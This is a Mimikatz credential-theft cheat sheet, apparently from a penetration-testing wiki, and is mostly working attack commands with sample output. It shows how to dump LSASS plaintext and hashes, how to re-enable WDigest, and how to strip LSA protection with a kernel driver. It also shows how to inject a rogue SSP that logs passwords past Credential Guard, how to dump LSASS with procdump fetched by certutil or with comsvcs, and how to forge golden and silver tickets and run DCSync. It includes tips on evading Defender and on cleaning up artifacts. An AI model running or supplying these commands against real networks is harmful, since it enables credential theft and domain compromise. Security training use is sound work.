Extract Passwords

Plaintext Credentials

Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.

mimikatz_command -f sekurlsa::logonPasswords full
mimikatz_command -f sekurlsa::wdigest

sekurlsa::logonpasswords Output Provider Legend

Each active session prints a block per credential-provider. Grep for the parts that matter:

Provider Contains Usable?
msv Primary NTLM + SHA1 + DPAPI master-key derivative YES — Pass-the-Hash with NTLM :
tspkg RDP-related (usually null on modern Win) rare — cleartext if present
wdigest Digest-auth cleartext (needs UseLogonCredential=1) YES when non-null — plaintext password
kerberos Kerberos service tickets + sometimes plaintext YES — plaintext password if non-null, or use tickets
ssp Legacy Security Support Provider (usually null) rare
credman Windows Credential Manager (RDP mstsc.exe saved creds) YES — see Target : + Password :
cloudap Azure AD / Entra Primary Refresh Token YES for AAD lateral (PRT abuse)

Full worked example + one-line grep is in ../post-exploitation/credential-dumping/credential-dumping.md#sekurlsa::logonpasswords-Output-Provider-Legend.

lsadump::cache — Domain Cached Credentials (DCC2)

Different from lsadump::sam (local users). cache reads offline cached logons from HKLM\SECURITY — hashes of last-N domain users who logged in while the DC was reachable. Cracks slow (hashcat mode 2100, PBKDF2-SHA1).

mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::cache
## * Username : administrator
## * Domain   : CORP.LOCAL
## * Hash MsCache2 : d4e1c0b16bcf9d1e9a4c...

Format for hashcat: $DCC2$10240#<username>#<hash>.

Re-enable WDigest (Windows Server 2012+)

In HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest, create a DWORD UseLogonCredential with the value 1:

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1

Conditions required:

  • Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:
  • Adding requires lock
  • Removing requires signout
  • Win10:
  • Adding requires signout
  • Removing requires signout
  • Win2016:
  • Adding requires lock
  • Removing requires reboot

LSA Protection Workaround

LSA as Protected Process (RunAsPPL)

Check if LSA runs as a protected process:

## Check if "RunAsPPL" is set to 0x1
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

Exploitation:

  1. Upload mimidriver.sys from the official mimikatz repo to the same folder as mimikatz.exe
  2. Import the driver:
mimikatz # !+
  1. Remove protection flags from lsass.exe:
mimikatz # !processprotect /process:lsass.exe /remove
  1. Run logonpasswords dump:
mimikatz # privilege::debug    
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
  1. Re-add protection flags:
mimikatz # !processprotect /process:lsass.exe
  1. Unload the driver:
mimikatz # !-

Alternative - PPLdump:

PPLdump.exe [-v] [-d] [-f] <PROC_NAME|PROC_ID> <DUMP_FILE>
PPLdump.exe lsass.exe lsass.dmp
PPLdump.exe -v 720 out.dmp

LSA Virtualized Process (Credential Guard / LSAISO)

Check if lsaiso.exe is running:

tasklist |findstr lsaiso

Or from PowerShell (more reliable signal):

Get-ComputerInfo | Select-String "DeviceGuardSecurityServicesRunning"
## DeviceGuardSecurityServicesRunning : {CredentialGuard, HypervisorEnforcedCodeIntegrity}

When Credential Guard is on, sekurlsa::logonpasswords returns hashes wrapped in LSA Isolated Data: NtlmHash blobs — unusable directly.

Full Credential Guard Bypass Workflow (misc::memssp)

memssp injects a rogue Security Support Provider into LSASS that logs every subsequent authentication in cleartext to disk. Bypasses Credential Guard because the SSP intercepts credentials AFTER decryption / BEFORE isolation.

## 0. Confirm Credential Guard is on (see above)

## 1. Attempt normal dump — confirms hashes are protected
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
## ... LSA Isolated Data: NtlmHash / Encrypted : <blob>

## 2. Inject the memory-resident SSP (mimilib.dll in same folder)
mimikatz # privilege::debug
mimikatz # misc::memssp
## Injected =)

## 3. Force victim to re-auth. Any of these triggers a fresh capture:
##      - Windows lock/unlock (Win+L then unlock)
##      - RDP disconnect/reconnect
##      - Logoff/logon
##      - runas /user:CORP\admin cmd.exe

## 4. Read captured cleartext creds
PS> type C:\Windows\System32\mimilsa.log
## [00000000:00af2311] CORP\Administrator      QWERTY123!@#
## [00000000:00b1dd77] CLIENTWK245\offsec      lab

## 5. Cleanup — memssp is persistent until reboot; the log file is discoverable
Remove-Item C:\Windows\System32\mimilsa.log -Force
## Reboot to unload the injected SSP

Every user session and authentication gets logged with plaintext credentials to c:\windows\system32\mimilsa.log until the machine reboots.

Report note it as a persistent artifact if you can't reboot the target.

Mini Dump

Dump lsass with procdump

Windows Defender is triggered when a memory dump of lsass is operated. Using lsass's PID "bypasses" that.

HTTP method:

certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp

SMB method (using PID):

net use Z: https://live.sysinternals.com
tasklist /fi "imagename eq lsass.exe"   # Find lsass's pid
Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp

Dump lsass with rundll32

rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full

Extract Credentials from Minidump

Using Mimikatz:

.\mimikatz.exe "sekurlsa::minidump lsass.dmp"
mimikatz # sekurlsa::logonPasswords

Using Pypykatz:

pypykatz lsa minidump lsass.dmp

Golden Ticket

Create a golden ticket to impersonate any user in the domain:

.\mimikatz "kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt" exit

Full example:

.\mimikatz "kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit

Silver Ticket

Similar to golden ticket but for a specific service. Grants access to a specific service without domain admin rights.

kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_HOST> /service:<SERVICE> /rc4:<HASH> /ptt

DCSync

Extract domain credentials without code execution on the DC:

mimikatz # lsadump::dcsync /user:<USERNAME>
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt

This will dump the NTLM hash of the specified user without needing to run code on the DC.

Commands Reference

Command Definition
CRYPTO::Certificates List/export certificates
KERBEROS::Golden Create golden/silver/trust tickets
KERBEROS::List List all user tickets (TGT and TGS) in user memory. No special privileges required. Similar to "klist"
KERBEROS::PTT Pass the ticket. Inject a stolen or forged Kerberos ticket (golden/silver/trust)
LSADUMP::DCSync Ask a DC to synchronize an object (get password data for account). No need to run code on DC
LSADUMP::LSA Retrieve SAM/AD enterprise credentials. Dump all domain credentials from DC or lsass.dmp. Use /name:krbtgt to get specific account
LSADUMP::SAM Dump local credentials from Security Account Manager (SAM) database
LSADUMP::Cache Dump domain-cached credentials (MSCache2 / DCC2) from HKLM\SECURITY. hashcat mode 2100
LSADUMP::Secrets Dump LSA secrets (DPAPI master keys, service account cleartext creds)
LSADUMP::Trust Retrieve Trust Auth Information. Dumps trust keys for all associated trusts
MISC::AddSid Add SIDHistory to user account
MISC::MemSSP Inject a malicious Windows SSP to log locally authenticated credentials
MISC::Skeleton Inject Skeleton Key into LSASS on Domain Controller. Enables master password authentication
PRIVILEGE::Debug Get debug rights. Required for many Mimikatz commands
SEKURLSA::Ekeys List Kerberos encryption keys
SEKURLSA::Kerberos List Kerberos credentials for all authenticated users
SEKURLSA::Krbtgt Get Domain Kerberos service account (KRBTGT) password data
SEKURLSA::LogonPasswords List all available provider credentials. Shows recently logged on users
SEKURLSA::Pth Pass-the-Hash and Over-Pass-the-Hash
SEKURLSA::Tickets List all available Kerberos tickets for all authenticated users
TOKEN::List List all tokens of the system
TOKEN::Elevate Impersonate a token. Elevate to SYSTEM or find domain admin token
